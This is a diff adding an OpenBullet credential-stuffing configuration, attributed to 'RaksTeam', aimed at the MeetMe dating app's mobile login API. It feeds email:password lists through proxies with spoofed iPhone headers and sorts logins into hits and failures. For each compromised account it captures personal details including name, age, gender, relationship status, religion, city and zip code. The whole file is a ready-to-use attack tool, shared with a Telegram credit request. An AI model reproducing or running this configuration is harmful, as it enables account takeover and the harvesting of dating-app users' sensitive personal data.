@@ -1,0 +1,118 @@
+[SETTINGS]
+{
+  "Name": "MEET ME [Config By RaksTeam]",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-04T15:48:49.7117032+05:30",
+  "AdditionalInfo": "AdditionalInfo\": \"MEET ME Openbullet Config By RaksTeam | Combo : E:P | Proxy : UHQ | Telegram : @RaksTeam\"",
+  "Author": "𝙉𝘼𝙎𝙀𝙀𝙈 (RaksTeam)",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
+REQUEST POST "https://ssl.meetme.com/mobile/login" 
+  CONTENT "emailId=<USER>&lat=9.083727&long=77.343521&password=<PASS>&skipResponseKeys=targeting&systemInfo={\"hardwareVersion\":\"iPhone9,3\",\"osVersion\":\"14.5.1\",\"connectionType\":\"WiFi\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "X-Device: iphone,D8873008-1CE1-4FA5-91B9-A17571841752,14.28.0.3:14.28.0.3" 
+  HEADER "X-Notificationtypes: friendAccept,newMatch,boostChat,smileSent,newMemberAlert" 
+  HEADER "Accept-Language: en_IN" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Stats: %7B%22memUsed%22:%221286127616%22,%22memTotal%22:%221333149696%22,%22methods%22:%5B%7B%22key%22:%22mobileRequestGeoData%22,%22roundTrip%22:%220.552614%22,%22parse%22:%220.000001%22%7D%5D%7D" 
+  HEADER "Content-Length: 6703" 
+  HEADER "User-Agent: MeetMe/14.28.0 (iPhone; iOS 14.5.1; Scale/2.00)" 
+  HEADER "X-Supportedfeatures: chatSuggestions,messageStickers,StackedNotifications:v6,tags,purchaseRevamp,freeTrial,strictHttps,twoStepRegistration,realtimeAtLogin,meetQueueSayHi,MediaLinkMessages:v1,liveVideo,PictureInPicture:v1,chatGiftMessage,faceVerification,requestInbox,perimeterX:v1,photoLikeMessage:v2,chatTopPicksMessage" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "memberId\":" 
+  KEYCHAIN Failure OR 
+    KEY "LoginException" 
+
+#1 PARSE "<SOURCE>" LR "first_name\":\"" "\"" -> VAR "1" 
+
+#2 PARSE "<SOURCE>" LR "last_name\":\"" "\"" -> VAR "2" 
+
+#Name FUNCTION Constant "<1> <2>" -> CAP "Name" 
+
+#Age PARSE "<SOURCE>" LR "age\":" "," CreateEmpty=FALSE -> CAP "Age" 
+
+#g PARSE "<SOURCE>" LR "gender\":\"" "\"" -> VAR "g" 
+
+#Gender FUNCTION Translate 
+  KEY "f" VALUE "FEMALE" 
+  KEY "m" VALUE "MALE" 
+  "<g>" -> CAP "Gender" 
+
+#Relationship PARSE "<SOURCE>" LR "relationship\":\"" "\"" CreateEmpty=FALSE -> CAP "Relationship" 
+
+#looking_for PARSE "<SOURCE>" LR "looking_for\":[\"" "\"]" CreateEmpty=FALSE -> CAP "looking_for" 
+
+#religion PARSE "<SOURCE>" LR "religion\":\"" "\"" CreateEmpty=FALSE -> CAP "religion" 
+
+#city PARSE "<SOURCE>" LR "{\"city\":\"" "\"" CreateEmpty=FALSE -> CAP "city" 
+
+#state PARSE "<SOURCE>" LR "state\":\"" "\"" CreateEmpty=FALSE -> CAP "state" 
+
+#country PARSE "<SOURCE>" LR "country\":\"" "\"" CreateEmpty=FALSE -> CAP "country" 
+
+#zip_code PARSE "<SOURCE>" LR "zip_code\":\"" "\"" CreateEmpty=FALSE -> CAP "zip_code" 
+
+#Owner FUNCTION Constant "@Naseem0348" -> CAP "Config Developed By" 
+
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
